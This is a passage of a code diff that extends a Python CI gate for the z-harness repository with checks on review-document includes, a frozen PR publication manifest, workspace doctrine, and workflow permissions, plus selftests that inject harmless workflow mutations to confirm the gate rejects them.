+EXPECTED_FROZEN_PUBLICATION = {
+    "schema_version": 1,
+    "kind": "pull-request-frozen-publication",
+    "repo": "ChrisHuie/z-harness",
+    "pr": 8,
+    "frozen_at_head": "695563715187810cf0dcfa9e52985974ee343831",
+    "body_bytes": 33954,
+    "body_sha256": "eb4115200a3dc487c9af24d727c871cfc203a5dbe6723aa41a6e7dac18e00e9e",
+    "title_bytes": 91,
+    "title_sha256": "e47233e8b50dad03d41ce2309f90e7c47328dfa12435f52a4fcdc30de33db8ac",
+    "note": (
+        "The body and title bytes were frozen when the append-only publication rule was "
+        "adopted at this observed head. Later review narrative, corrections, and exact-head "
+        "evidence are append-only pull-request comments."
+    ),
+}
+
+
+def include_blocks(lines):
+    """(header, close, name) per include block, ignoring blocks inside a code fence.
+
+    The include syntax has to be DOCUMENTED somewhere, and the only place it belongs is
+    contracts/review/README.md -- inside a fence, as an example. A scanner blind to fences
+    reads that example as a live include and reports the README as drifted from a file the
+    example never claimed to copy, so the convention's own documentation cannot satisfy it.
+
+    A block's body is skipped wholesale rather than scanned, so a fence in INCLUDED content
+    -- a generated table may carry one -- cannot leave the scanner stuck in a fence and
+    silently blind to every later include.
+    """
+    found, fence, index = [], None, 0
+    while index < len(lines):
+        stripped = lines[index].lstrip()
+        marker = next((m for m in FENCE_MARKERS if stripped.startswith(m)), None)
+        if fence is not None:
+            fence = None if marker == fence else fence
+        elif marker:
+            fence = marker
+        elif INCLUDE_OPEN in lines[index]:
+            head = lines[index].split(INCLUDE_OPEN, 1)[1]
+            name = head.split("-->")[0].strip() if "-->" in head else ""
+            close = next((j for j in range(index + 1, len(lines))
+                          if INCLUDE_CLOSE in lines[j]), None)
+            found.append((index, close, name))
+            if close is None:
+                break
+            index = close + 1
+            continue
+        index += 1
+    return found
+
+
+def review_path_label(path):
+    """Repo-relative where that reads better, absolute where relative_to would raise.
+
+    A document outside the repo only appears in this check's own fixtures, but raising
+    ValueError while BUILDING a failure message turns a reported problem into a crash.
+    """
+    try:
+        return path.relative_to(ROOT)
+    except ValueError:
+        return path
+
+
+def review_include_error(review_root=None, required_inventory=None) -> str:
+    """The problem alone. Callers that report a verdict want review_include_scan."""
+    return review_include_scan(review_root, required_inventory)[0]
+
+
+def review_include_scan(review_root=None, required_inventory=None) -> tuple[str, int, int]:
+    """Return any registered review document whose included block drifted from its source.
+
+    A block marked as included must be byte-identical to the file it names, so a generated
+    table cannot go stale in a document that quotes it.
+
+    What this does NOT cover, stated because the docstring previously claimed it did: the
+    text a reviewer actually reads. That rationale was written when outbound review text was
+    drafted as tracked files under this directory. The append-only rule moved it to posted
+    comments, and README.md in this directory says the consequence plainly -- nothing in this
+    repository can see a posted comment or live PR body. A number retyped into a comment is
+    still outside every gate here; `tools/verify-review-publication.py` reads one back after
+    the fact, which is a different mechanism and a different guarantee.
+
+    Two arms, both live. The inventory is closed: an include block in a document that does
+    not declare one fails, so with the required inventory empty an include block is currently
+    forbidden outright rather than merely ungraded. A declared block is then compared byte for
+    byte against the file it names. Measured: registered and identical passes, registered and
+    tampered fails on drift, and unregistered fails on the inventory.
+
+    The verdict prints the document and block counts rather than a bare PASS, so a run that
+    graded no blocks cannot read as coverage of blocks.
+
+    A missing directory and an empty one remain failures rather than clean verdicts: the
+    check asserts over a registered inventory, and it cannot assert that over nothing.
+    """
+    root = REVIEW_ROOT if review_root is None else Path(review_root)
+    enforce_inventory = review_root is None if required_inventory is None else True
+    required_inventory = (
+        REQUIRED_REVIEW_INCLUDES if required_inventory is None else required_inventory)
+    if not root.is_dir():
+        return (f"{REVIEW_ROOT.name}/ does not exist, so no outbound review text is gated; "
+                "this check asserts nothing without it", 0, 0)
+    documents = sorted(root.rglob("*.md"))
+    if not documents:
+        return (f"no markdown under {root}, so the review-include check scanned nothing, "
+                "which is not a clean verdict", 0, 0)
+    problems, blocks, observed_inventory = [], 0, {}
+    for document in documents:
+        try:
+            document_bytes = document.read_bytes()
+            lines = document_bytes.decode("utf-8").splitlines()
+            raw_lines = document_bytes.splitlines(keepends=True)
+        except UnicodeDecodeError as exc:
+            problems.append(
+                f"{review_path_label(document)} is not UTF-8 ({exc})")
+            continue
+        for header, close, name in include_blocks(lines):
+            blocks += 1
+            relative_document = str(document.relative_to(root))
+            observed_inventory.setdefault(relative_document, []).append(name)
+            if close is None:
+                problems.append(f"{review_path_label(document)}: unterminated include")
+                continue
+            if not name:
+                problems.append(f"{review_path_label(document)}: include names no file")
+                continue
+            source = (ROOT / name).resolve()
+            try:
+                source.relative_to(ROOT.resolve())
+            except ValueError:
+                problems.append(
+                    f"{review_path_label(document)} includes {name}, which is outside "
+                    "the repository")
+                continue
+            if not source.is_file():
+                problems.append(f"{review_path_label(document)} includes {name}, "
+                                "which does not exist")
+                continue
+            embedded = b"".join(raw_lines[header + 1:close])
+            expected = source.read_bytes()
+            if embedded != expected:
+                problems.append(
+                    f"{review_path_label(document)} has a stale copy of {name}; "
+                    "regenerate it before posting")
+    if enforce_inventory:
+        observed = {document: tuple(sorted(names))
+                    for document, names in observed_inventory.items()}
+        required = {document: tuple(sorted(names))
+                    for document, names in required_inventory.items()}
+        if observed != required:
+            problems.append(
+                f"live include inventory differs: observed={observed} required={required}")
+    if problems:
+        return (f"outbound review text drifted from its sources "
+                f"(scanned {len(documents)} files, {blocks} include blocks under "
+                f"{root}): " + "; ".join(problems[:5]), len(documents), blocks)
+    return "", len(documents), blocks
+
+
+def eval_corpus_distribution_error(counts=None, floors=None) -> str:
+    """Require every skill's own eval corpus to hold, not merely the totals."""
+    floors = EVAL_SCENARIO_FLOORS if floors is None else floors
+    if counts is None:
+        counts = {}
+        skills_root = ROOT / "skills"
+        if skills_root.is_dir():
+            for skill in sorted(skills_root.iterdir()):
+                found = sorted((skill / "evals").glob("*.json")) if skill.is_dir() else []
+                if found:
+                    counts[skill.name] = len(found)
+    problems = []
+    for skill, floor in sorted(floors.items()):
+        observed = counts.get(skill, 0)
+        if observed < floor:
+            problems.append(f"{skill} holds {observed} scenario(s), floor {floor}")
+    return ("eval corpus distribution: " + "; ".join(problems[:6])) if problems else ""
+
+
+def _raises(call, kind) -> bool:
+    """True when `call` raises `kind`; a check that swallows it would prove nothing."""
+    try:
+        call()
+    except kind:
+        return True
+    except Exception:
+        return False
+    return False
+
+
+def review_document_inventory_error(review_root=None, expected_paths=None) -> str:
+    """Require the review tree's exact registered relative paths and regular files."""
+    root = REVIEW_ROOT if review_root is None else Path(review_root)
+    expected = REGISTERED_REVIEW_PATHS if expected_paths is None else frozenset(expected_paths)
+    if not root.is_dir() or root.is_symlink():
+        return f"review document root is absent, symlinked, or not a directory: {root}"
+    observed, invalid = set(), []
+    for path in root.rglob("*"):
+        if path.is_dir() and not path.is_symlink():
+            continue
+        relative = str(path.relative_to(root))
+        if path.is_symlink() or not path.is_file():
+            invalid.append(relative)
+        else:
+            observed.add(relative)
+    missing = sorted(expected - observed)
+    unexpected = sorted(observed - expected)
+    problems = []
+    if invalid:
+        problems.append(f"symlinked or non-regular entries={sorted(invalid)}")
+    if missing:
+        problems.append(f"missing={missing}")
+    if unexpected:
+        problems.append(f"unexpected={unexpected}")
+    return "review document inventory: " + " ".join(problems) if problems else ""
+
+
+def review_publication_manifest_error(data=None) -> str:
+    """Require the frozen PR publication snapshot to match its reviewed contract."""
+    try:
+        if data is None:
+            data = _json_without_duplicate_keys(FROZEN_PUBLICATION)
+    except (OSError, ValueError) as exc:
+        return f"cannot read frozen PR publication manifest: {exc}"
+    if not isinstance(data, dict):
+        return "frozen PR publication manifest is not an object"
+    if data != EXPECTED_FROZEN_PUBLICATION:
+        missing = sorted(set(EXPECTED_FROZEN_PUBLICATION) - set(data))
+        unexpected = sorted(set(data) - set(EXPECTED_FROZEN_PUBLICATION))
+        changed = sorted(
+            key for key in set(data) & set(EXPECTED_FROZEN_PUBLICATION)
+            if data[key] != EXPECTED_FROZEN_PUBLICATION[key]
+        )
+        return (
+            "frozen PR publication manifest differs from the reviewed snapshot: "
+            f"missing={missing} unexpected={unexpected} changed={changed}"
+        )
+    return ""
+
+
+def spawn_guard_activation_error(source=None):
+    """Return why the explicit installed scratch-enforcement path is incomplete."""
+    try:
+        text = (ROOT / SPAWN_GUARD_SOURCE).read_text(encoding="utf-8") if source is None \
+            else source
+    except OSError as exc:
+        return f"cannot read {SPAWN_GUARD_SOURCE}: {exc}"
+    required = (
+        'args[0] == "--require-scratch"',
+        "if require_scratch:",
+        "protected_workspace_root(payload.get(\"cwd\"))",
+        'reserve=decision != "deny"',
+        # The workspace root travels into the reservation. Pinned in this shape because the
+        # path-based containment proof and the mkdir are separated by a window an ancestor
+        # rename can move; the descriptor walk inside reserve_scratch is what closes it, and
+        # it cannot run without this argument.
+        "reserve_scratch(path, workspace_root)",
+        "_fd_within_workspace(parent_fd, workspace_root)",
+    )
+    missing = [fragment for fragment in required if fragment not in text]
+    if missing:
+        return (
+            "spawn guard explicit scratch activation is incomplete: "
+            f"missing={missing}")
+    if "WORKSPACE_RULE_MARKER" in text or "project_requires_scratch" in text:
+        return "spawn guard still lets repository prose disable installed scratch enforcement"
+    return ""
+
+
+def workspace_doctrine_error(source_texts=None, doctrine=None,
+                             forbidden_paths=None, negations=None,
+                             guard_source=None) -> tuple[str, int, int]:
+    """(problem, documents scanned, forbidden-path hits) for the worker-workspace rule.
+
+    Two halves, because a required-phrase check is monotone: adding text never removes a
+    phrase, so presence alone cannot say the rule survived a rewrite. The forbidden half is
+    its dual and is what keeps the rule portable -- the shared policy must state the property
+    and must not name any single runtime's directory.
+
+    An empty table on either side is a failure rather than a clean verdict; this check cannot
+    assert anything over nothing.
+    """
+    doctrine = WORKSPACE_DOCTRINE if doctrine is None else doctrine
+    forbidden_paths = (RUNTIME_PATHS_FORBIDDEN_IN_SHARED_POLICY
+                       if forbidden_paths is None else forbidden_paths)
+    negations = FORBIDDEN_WORKSPACE_NEGATIONS if negations is None else negations
+    if not negations:
+        return ("workspace negation set is empty, so the rule can be revoked in prose", 0, 0, 0)
+    if not doctrine:
+        return ("workspace doctrine table is empty, so this check asserts nothing", 0, 0, 0)
+    if not forbidden_paths:
+        return ("runtime-path forbidden set is empty, so the shared policy is "
+                "unconstrained", 0, 0, 0)
+    problems = []
+    if source_texts is None:
+        source_texts = {}
+        for relative in doctrine:
+            path = ROOT / relative
+            if not path.is_file():
+                problems.append(f"missing workspace doctrine source {relative}")
+                continue
+            source_texts[relative] = path.read_text(encoding="utf-8")
+    for relative, required in doctrine.items():
+        text = source_texts.get(relative)
+        if text is None:
+            problems.append(f"missing workspace doctrine source {relative}")
+            continue
+        normalized = re.sub(r"\s+", " ", text)
+        for phrase in required:
+            if phrase not in normalized:
+                problems.append(
+                    f"{relative} is missing required workspace rule {phrase!r}")
+    # The shared policy must be IN the scan set. Reading it as optional made a clean verdict
+    # indistinguishable from never having checked: both reported hits=0 with no problem.
+    shared = source_texts.get(SHARED_POLICY_DOCUMENT)
+    # Two counters, not one. A single tally was printed as "runtime-path hit(s)" while it also
+    # carried negation hits, so a revocation was reported under the wrong name; and with one
+    # tally an assertion about either arm could be satisfied by the other.
+    path_hits = 0
+    negation_hits = 0
+    if shared is None:
+        problems.append(
+            f"the shared policy {SHARED_POLICY_DOCUMENT} is absent from the scanned set, so the "
+            "runtime-path and negation arms asserted nothing")
+    else:
+        normalized_shared = re.sub(r"\s+", " ", shared).lower()
+        for path_text in forbidden_paths:
+            if path_text in shared:
+                path_hits += 1
+                problems.append(
+                    f"{SHARED_POLICY_DOCUMENT} names the runtime-specific path "
+                    f"{path_text!r}; the shared policy states the property and the adapter "
+                    "names the path")
+        for negation in negations:
+            if negation in normalized_shared:
+                negation_hits += 1
+                problems.append(
+                    f"{SHARED_POLICY_DOCUMENT} carries the retired spelling {negation!r}, which "
+                    "revokes the rule the required phrases assert")
+        activation_problem = spawn_guard_activation_error(guard_source)
+        if activation_problem:
+            problems.append(activation_problem)
+    if problems:
+        return ("worker-workspace doctrine: " + "; ".join(problems[:5]),
+                len(source_texts), path_hits, negation_hits)
+    return "", len(source_texts), path_hits, negation_hits
+
+
+def _missing_dispatch_body_probe() -> str:
+    """Exercise the missing-body arm without moving the module constant."""
+    saved = globals()["DISPATCH_BODY_DOCUMENT"]
+    globals()["DISPATCH_BODY_DOCUMENT"] = "no/such/dispatch/body.md"
+    try:
+        return retired_dispatch_claim_error()
+    finally:
+        globals()["DISPATCH_BODY_DOCUMENT"] = saved
+
+
+def retired_dispatch_claim_error(body_text=None, retired=None) -> str:
+    """Reject a retired external-tool claim in the dispatch skill body.
+
+    The body is what an agent loads before acting, so a mechanism named there is taken as
+    available. This one named a subagent system-prompt flag that the installed CLI's help does
+    not list, which is the shape that sends an implementer to build on nothing.
+    """
+    retired = RETIRED_DISPATCH_CLAIMS if retired is None else retired
+    if not retired:
+        return "retired dispatch claim set is empty, so this check asserts nothing"
+    if body_text is None:
+        path = ROOT / DISPATCH_BODY_DOCUMENT
+        if not path.is_file():
+            return f"missing dispatch body {DISPATCH_BODY_DOCUMENT}"
+        body_text = path.read_text(encoding="utf-8")
+    normalized = re.sub(r"\s+", " ", body_text).lower()
+    found = [phrase for phrase in retired if phrase.lower() in normalized]
+    if found:
+        return (f"{DISPATCH_BODY_DOCUMENT} asserts retired external-tool channel(s) {found}; "
+                "ground a channel in the installed CLI or state it as unverified")
+    return ""
+
+
+def tracked_markdown_sources(root=ROOT, runner=None):
+    """Return the exact-root tracked Markdown corpus, or one fail-closed error."""
+    root = Path(root)
+    runner = subprocess.run if runner is None else runner
+    root_problem = git_toplevel_error(str(root), runner)
+    if root_problem:
+        return {}, f"cannot identify tracked-markdown repository: {root_problem}"
+    try:
+        listed = run_git(
+            runner,
+            ["git", "-C", str(root), "ls-files", "-z", "--", "*.md"],
+            capture_output=True,
+        )
+    except OSError as exc:
+        return {}, f"cannot enumerate tracked markdown: {exc}"
+    if listed.returncode != 0:
+        detail = bytes(listed.stderr or b"").decode("utf-8", "replace").strip()
+        return {}, (
+            f"cannot enumerate tracked markdown: git ls-files exited {listed.returncode}"
+            f"{': ' + detail[:200] if detail else ''}"
+        )
+    raw = bytes(listed.stdout or b"")
+    if not raw or not raw.endswith(b"\0"):
+        return {}, "cannot enumerate tracked markdown: empty or unterminated Git inventory"
+    names = [os.fsdecode(item) for item in raw[:-1].split(b"\0") if item]
+    if not names:
+        return {}, "cannot enumerate tracked markdown: zero files"
+    sources = {}
+    physical_root = os.path.realpath(root)
+    for name in names:
+        if os.path.isabs(name) or ".." in Path(name).parts:
+            return {}, f"tracked markdown inventory returned unsafe path {name!r}"
+        path = root / name
+        if path.is_symlink() or not path.is_file():
+            return {}, f"tracked markdown is not a regular owned file: {name}"
+        physical = os.path.realpath(path)
+        try:
+            within = os.path.commonpath((physical_root, physical)) == physical_root
+        except ValueError:
+            within = False
+        if not within:
+            return {}, f"tracked markdown escapes the repository: {name}"
+        try:
+            sources[name] = path.read_text(encoding="utf-8")
+        except (OSError, UnicodeError) as exc:
+            return {}, f"cannot read tracked markdown {name}: {exc}"
+    return sources, ""
+
+
+def review_handoff_policy_error(source_texts=None, review_root=None,
+                                extra_texts=None, required_includes=None,
+                                markdown_root=ROOT, runner=None) -> str:
+    """Require append-only head-specific handoffs and reject the retired mutable artifact."""
+    problems = []
+    if source_texts is None:
+        source_texts = {}
+        for relative in HANDOFF_DOCTRINE:
+            path = ROOT / relative
+            if not path.is_file():
+                problems.append(f"missing handoff doctrine source {relative}")
+                continue
+            source_texts[relative] = path.read_text(encoding="utf-8")
+    for relative, required in HANDOFF_DOCTRINE.items():
+        text = source_texts.get(relative)
+        if text is None:
+            problems.append(f"missing handoff doctrine source {relative}")
+            continue
+        normalized_text = re.sub(r"\s+", " ", text)
+        for phrase in required:
+            if phrase not in normalized_text:
+                problems.append(f"{relative} is missing required handoff rule {phrase!r}")
+    # Scan every markdown document, not only the four that carry the rule. The retired
+    # spelling is not legitimate anywhere here, and the file that outranks every skill --
+    # AGENTS.md -- is not among the four, so a scan limited to them left the one document
+    # that could reinstate the rule with the most authority entirely unread.
+    scanned = {}
+    if extra_texts is None:
+        # Tracked files only. A directory walk also reads nested worktrees and any other
+        # untracked checkout living inside the tree, which are other branches' bytes and
+        # not this commit's claim -- the same mistake that makes C8 red locally and green
+        # in CI. `git ls-files` is the scan set the commit is actually accountable for.
+        tracked, tracked_problem = tracked_markdown_sources(markdown_root, runner=runner)
+        if tracked_problem:
+            problems.append(tracked_problem)
+        else:
+            scanned.update(tracked)
+    else:
+        scanned.update(extra_texts)
+    # The explicit doctrine sources are the authoritative injected test seam. Production
+    # passes the same repository bytes, while a planted source mutation must not be erased by
+    # the tracked inventory loaded above.
+    scanned.update(source_texts)
+    for relative, text in sorted(scanned.items()):
+        joined = re.sub(r"\s+", " ", text).casefold()
+        for phrase in FORBIDDEN_HANDOFF_DOCTRINE:
+            if phrase in joined:
+                problems.append(
+                    f"retired mutable-handoff rule is present in {relative}: {phrase!r}")
+    root = REVIEW_ROOT if review_root is None else Path(review_root)
+    inventory_problem = review_document_inventory_error(root)
+    if inventory_problem:
+        problems.append(inventory_problem)
+    # Injectable so the error arm can execute. Reading only the module constant left this
+    # clause unreachable while that constant is empty, which is the shape of a detector whose
+    # failure branch has never run.
+    if required_includes is None:
+        required_includes = REQUIRED_REVIEW_INCLUDES
+    unknown_include_documents = sorted(
+        set(required_includes) - REGISTERED_REVIEW_PATHS)
+    if unknown_include_documents:
+        problems.append(
+            f"required includes name unregistered documents: {unknown_include_documents}")
+    if not problems:
+        return ""
+    # Per testing-ci: a guard that models only the spellings it knows must say so where the
+    # verdict is read. Required-phrase presence is monotone -- a document can carry the rule
+    # and contradict it in the next paragraph -- and the forbidden list is a denylist that
+    # a paraphrase walks past. Both arms are tripwires, not proofs.
+    return (
+        "review handoff policy mismatch: " + "; ".join(problems[:8])
+        + " (scope: literal retired spellings across tracked markdown and registered "
+        + "document names; a paraphrase or an added contradicting rule is out of scope)")
+
+
+def gated_environment(which=None, runner=None) -> str:
+    """Name the interpreters this run's verdicts were measured against.
+
+    Two probe corpora reduce to skips when zsh is missing -- 105 modifier probes and 46
+    zsh-dependent shell-boundary probes -- and both preserve their planned check counts.
+    A suite's receipt is therefore byte-identical whether those probes ran or were skipped,
+    and only a child's LAST line survives this gate, which drops the printed SKIP. Without
+    this line nothing in the record distinguishes the two, so a claim about zsh could go
+    unverified on a runner with no zsh and read as proven.
+
+    Reported, never asserted: a host without zsh may still run the gate. What it may not
+    do is leave no trace that the zsh-dependent claims were not checked.
+    """
+    which = shutil.which if which is None else which
+    runner = subprocess.run if runner is None else runner
+    parts = []
+    for name in ("git", "zsh"):
+        path = which(name)
+        if not path:
+            parts.append(f"{name}=absent")
+            continue
+        try:
+            result = runner([path, "--version"], capture_output=True, text=True,
+                            timeout=10)
+            reported = result.stdout.strip().splitlines()
+            version = reported[0] if reported else "unreported"
+        except (OSError, subprocess.SubprocessError):
+            version = "unreported"
+        parts.append(f"{name}={path} ({version})")
+    return "CI-GATE-ENV " + " ".join(parts)
+
+
 def gate(
     runner: Callable[[Sequence[str]], Result] = run_command,
     *,
@@ -243,10 +2710,28 @@ def gate(
 ) -> int:
     failures: List[str] = []
     workflow = WORKFLOW.read_text(encoding="utf-8") if WORKFLOW.is_file() else ""
-    problem = workflow_error(workflow)
+    mutation_workflow = (
+        MUTATION_WORKFLOW.read_text(encoding="utf-8")
+        if MUTATION_WORKFLOW.is_file() else ""
+    )
+    problem = workflow_error(workflow, mutation_workflow)
     print(f"  {'FAIL' if problem else 'PASS'} workflow-contract")
     if problem:
         failures.append(problem)
+    publication_workflow_problem = publication_workflow_error(workflow)
+    print(
+        f"  {'FAIL' if publication_workflow_problem else 'PASS'} "
+        "workflow-authority-contract"
+    )
+    if publication_workflow_problem:
+        failures.append(publication_workflow_problem)
+    mutation_authority_problem = mutation_workflow_authority_error(mutation_workflow)
+    print(
+        f"  {'FAIL' if mutation_authority_problem else 'PASS'} "
+        "mutation-workflow-authority-contract"
+    )
+    if mutation_authority_problem:
+        failures.append(mutation_authority_problem)
     present = (
         tuple(sorted(p.name for p in WORKFLOW_DIR.iterdir() if p.is_file()))
         if WORKFLOW_DIR.is_dir() else ()
@@ -261,6 +2746,82 @@ def gate(
           f"({len(present)} file(s))")
     if inventory_problem:
         failures.append(inventory_problem)
+    floor_problem = floor_registry_error()
+    print(f"  {'FAIL' if floor_problem else 'PASS'} floor-registry")
+    if floor_problem:
+        failures.append(floor_problem)
+    harness_source_problem = harness_source_error()
+    print(f"  {'FAIL' if harness_source_problem else 'PASS'} harness-source")
+    if harness_source_problem:
+        failures.append(harness_source_problem)
+    ownership_source_problem = repository_ownership_source_error()
+    print(f"  {'FAIL' if ownership_source_problem else 'PASS'} repository-ownership-source")
+    if ownership_source_problem:
+        failures.append(ownership_source_problem)
+    # Reported here rather than in the tracked summary: whether an assertion fires can differ
+    # between hosts, so this count belongs in the run that observed it, not in a file two
+    # hosts compare byte for byte.
+    try:
+        _receipt = _json_without_duplicate_keys(MUTATION_RECEIPT)
+        _unasserted = len(_receipt.get("unasserted_kills") or [])
+        _caught = _receipt.get("caught")
+        print(f"  INFO mutation-kills caught={_caught} scored-on-count-alone={_unasserted} "
+              f"ceiling={mutation_unasserted_kill_ceiling()} "
+              f"(recorded in the committed receipt, not measured on this host)")
+    except Exception as exc:
+        print(f"  INFO mutation-kills unavailable: {exc!r}")
+    generator_source_problem = mutation_generator_source_error()
+    print(f"  {'FAIL' if generator_source_problem else 'PASS'} mutation-generator-source")
+    if generator_source_problem:
+        failures.append(generator_source_problem)
+    budget_problem = hook_budget_error()
+    print(f"  {'FAIL' if budget_problem else 'PASS'} hook-budget")
+    if budget_problem:
+        failures.append(budget_problem)
+    decision_problem = decision_golden_error()
+    print(f"  {'FAIL' if decision_problem else 'PASS'} decision-golden")
+    if decision_problem:
+        failures.append(decision_problem)
+    mutation_problem = mutation_receipt_error()
+    print(f"  {'FAIL' if mutation_problem else 'PASS'} mutation-receipt")
+    if mutation_problem:
+        failures.append(mutation_problem)
+    summary_problem = mutation_summary_error()
+    print(f"  {'FAIL' if summary_problem else 'PASS'} mutation-summary")
+    if summary_problem:
+        failures.append(summary_problem)
+    retired_claim_problem = retired_dispatch_claim_error()
+    print(f"  {'FAIL' if retired_claim_problem else 'PASS'} dispatch-channel-claims "
+          f"over {len(RETIRED_DISPATCH_CLAIMS)} retired spelling(s) in "
+          f"{DISPATCH_BODY_DOCUMENT}")
+    if retired_claim_problem:
+        failures.append(retired_claim_problem)
+    (workspace_problem, workspace_documents, workspace_path_hits,
+     workspace_negation_hits) = workspace_doctrine_error()
+    print(f"  {'FAIL' if workspace_problem else 'PASS'} worker-workspace-doctrine "
+          f"over {workspace_documents} document(s), "
+          f"{workspace_path_hits} runtime-path hit(s) and "
+          f"{workspace_negation_hits} negation hit(s) in {SHARED_POLICY_DOCUMENT}")
+    if workspace_problem:
+        failures.append(workspace_problem)
+    review_problem, review_documents, review_blocks = review_include_scan()
+    print(f"  {'FAIL' if review_problem else 'PASS'} review-includes "
+          f"over {review_documents} document(s), {review_blocks} include block(s) "
+          f"under {REVIEW_ROOT.name}/")
+    if review_problem:
+        failures.append(review_problem)
+    distribution_problem = eval_corpus_distribution_error()
+    print(f"  {'FAIL' if distribution_problem else 'PASS'} eval-corpus-distribution")
+    if distribution_problem:
+        failures.append(distribution_problem)
+    handoff_problem = review_handoff_policy_error()
+    print(f"  {'FAIL' if handoff_problem else 'PASS'} review-handoff-policy")
+    if handoff_problem:
+        failures.append(handoff_problem)
+    publication_problem = review_publication_manifest_error()
+    print(f"  {'FAIL' if publication_problem else 'PASS'} review-publication-snapshot")
+    if publication_problem:
+        failures.append(publication_problem)
     completed = 1
     with tempfile.TemporaryDirectory(prefix="z-harness-ci-gate-") as raw:
         render_root = Path(raw) / "rendered"
@@ -282,6 +2843,7 @@ def gate(
     code = 1 if failures else 0
     for failure in failures:
         print(f"  - {failure}")
+    print(gated_environment())
     print(
         f"CI-GATE-SUMMARY suites={completed} failures={len(failures)} exit={code}"
     )
@@ -307,10 +2869,718 @@ def selftest() -> int:
     expect("below-floor count fails", validate_receipt(Result(0, good.replace("checks=5", "checks=4")), spec) is not None)
     expect("reported failure fails", validate_receipt(Result(0, good.replace("failures=0", "failures=1")), spec) is not None)
     expect("nonzero process with green receipt fails", validate_receipt(Result(1, good), spec) is not None)
+    git_exact = expected_selftest_checks("git_grep_engine_guard")
+    git_spec = selftest_receipt("git_grep_engine_guard", SUITE_FLOORS["git_grep_engine_guard"])
+    git_good = ("SELFTEST-SUMMARY suite=git_grep_engine_guard "
+                f"checks={git_exact} failures=0\n")
+    expect(
+        "execution-derived Git count clears at the exact environment cardinality",
+        validate_receipt(Result(0, git_good), git_spec) is None,
+    )
+    expect(
+        "deleting one Git check fails even while the floor still clears",
+        validate_receipt(
+            Result(0, git_good.replace(f"checks={git_exact}",
+                                       f"checks={git_exact - 1}")),
+            git_spec,
+        ) is not None,
+    )
     expect("workflow baseline matches exact contract", workflow_error(EXPECTED_WORKFLOW) is None)
-    expect("workflow command mutation fails", workflow_error(EXPECTED_WORKFLOW.replace(
+    expect(
+        "publication workflow baseline matches its independent semantic contract",
+        publication_workflow_error(EXPECTED_WORKFLOW) == "",
+    )
+
+    def publication_semantic_mutation(old, new, diagnosis):
+        block = _yaml_mapping_block(EXPECTED_WORKFLOW, "  publication:")
+        if not block or block.count(old) != 1:
+            return False
+        mutated = EXPECTED_WORKFLOW.replace(block, block.replace(old, new, 1), 1)
+        problem = publication_workflow_error(mutated)
+        return diagnosis in problem
+
+    def coordinated_job_mutation(old, new, diagnosis):
+        """Move the byte oracle with a changed workflow; semantic authority must still red."""
+        if EXPECTED_WORKFLOW.count(old) != 1:
+            return False
+        mutated = EXPECTED_WORKFLOW.replace(old, new, 1)
+        original = EXPECTED_WORKFLOW
+        globals()["EXPECTED_WORKFLOW"] = mutated
+        try:
+            return workflow_error(mutated) is None and diagnosis in publication_workflow_error(
+                mutated)
+        finally:
+            globals()["EXPECTED_WORKFLOW"] = original
+
+    for label, old, new, diagnosis in (
+        ("push trigger",
+         "    branches: [main]\n",
+         "    branches: [other]\n",
+         "push trigger is not exactly main"),
+        ("check write authority",
+         "  check:\n    strategy:\n",
+         "  check:\n    permissions:\n      contents: write\n    strategy:\n",
+         "check workflow job fields"),
+        ("check gate command",
+         "          python3 tools/ci-gate.py\n",
+         "          echo skipped-ci-gate\n",
+         "check workflow gate command sequence"),
+        ("portable-conformance write authority",
+         "  portable-conformance:\n    runs-on: ubuntu-24.04\n",
+         "  portable-conformance:\n    permissions:\n      contents: write\n"
+         "    runs-on: ubuntu-24.04\n",
+         "portable-conformance workflow job fields"),
+        ("portable-conformance command",
+         "        run: python3 tools/portable-conformance.py\n",
+         "        run: echo skipped-conformance\n",
+         "portable-conformance command"),
+    ):
+        expect(
+            f"coordinated workflow bytes cannot hide changed {label}",
+            coordinated_job_mutation(old, new, diagnosis),
+        )
+
+    publication_block = _yaml_mapping_block(EXPECTED_WORKFLOW, "  publication:")
+    workflow_without_publication = EXPECTED_WORKFLOW.replace(publication_block, "", 1)
+    original_expected_workflow = EXPECTED_WORKFLOW
+    globals()["EXPECTED_WORKFLOW"] = workflow_without_publication
+    try:
+        expect(
+            "coordinated publication-job and workflow-oracle deletion still turns red",
+            workflow_error(workflow_without_publication) is None
+            # The exact diagnosis, not merely non-empty. This is the only case asserting the
+            # oracle is independent of the byte tripwire, and `!= ""` over fourteen non-empty
+            # return paths let the branch it names be neutralised while three fallbacks kept
+            # the assertion true.
+            and publication_workflow_error(workflow_without_publication)
+            == "publication workflow job is absent or duplicated",
+        )
+    finally:
+        globals()["EXPECTED_WORKFLOW"] = original_expected_workflow
+    expect(
+        "publication workflow rejects a filtered pull-request trigger",
+        EXPECTED_WORKFLOW.count("  pull_request:\n") == 1
+        and "trigger is filtered" in publication_workflow_error(
+            EXPECTED_WORKFLOW.replace(
+                "  pull_request:\n",
+                "  pull_request:\n    paths: [README.md]\n", 1)),
+    )
+    expect(
+        "publication workflow rejects an absent pull-request trigger",
+        "trigger inventory" in publication_workflow_error(
+            EXPECTED_WORKFLOW.replace("  pull_request:\n", "", 1)),
+    )
+    # A duplicated job satisfies every downstream check, because the block lookup takes the
+    # first match and never inspects the second -- which may carry `contents: write`.
+    expect(
+        "publication workflow rejects a duplicated job",
+        publication_workflow_error(EXPECTED_WORKFLOW.replace(
+            publication_block, publication_block + publication_block, 1))
+        == "publication workflow job is absent or duplicated",
+    )
+    # The jobs mapping was append-open. A sibling job is invisible to every closed list this
+    # function builds, because they cover top-level keys, needle counts, and lists inside the
+    # publication block -- never the mapping itself.
+    for position, mutated_workflow in (
+            ("appended after", EXPECTED_WORKFLOW
+             + "  exfil:\n    runs-on: ubuntu-24.04\n"
+               "    permissions:\n      contents: write\n"
+               "    steps:\n      - run: echo arbitrary\n"),
+            ("inserted before", EXPECTED_WORKFLOW.replace(
+                "  publication:\n",
+                "  exfil:\n    runs-on: ubuntu-24.04\n"
+                "    steps:\n      - run: echo arbitrary\n  publication:\n", 1)),
+    ):
+        expect(
+            f"publication workflow rejects a sibling job {position} publication",
+            publication_workflow_error(mutated_workflow)
+            == "publication workflow job inventory is not exactly closed",
+        )
+    # Top-level permissions had their KEY pinned and their CONTENT unread. The publication job
+    # overrides them, but check and portable-conformance inherit, so a widened token reaches
+    # those two silently.
+    for label, replacement in (
+            ("widened to write", "permissions:\n  contents: write\n"),
+            ("granted an extra scope",
+             "permissions:\n  contents: read\n  pull-requests: write\n"),
+    ):
+        expect(
+            f"publication workflow rejects top-level permissions {label}",
+            EXPECTED_WORKFLOW.count("permissions:\n  contents: read\n") == 1
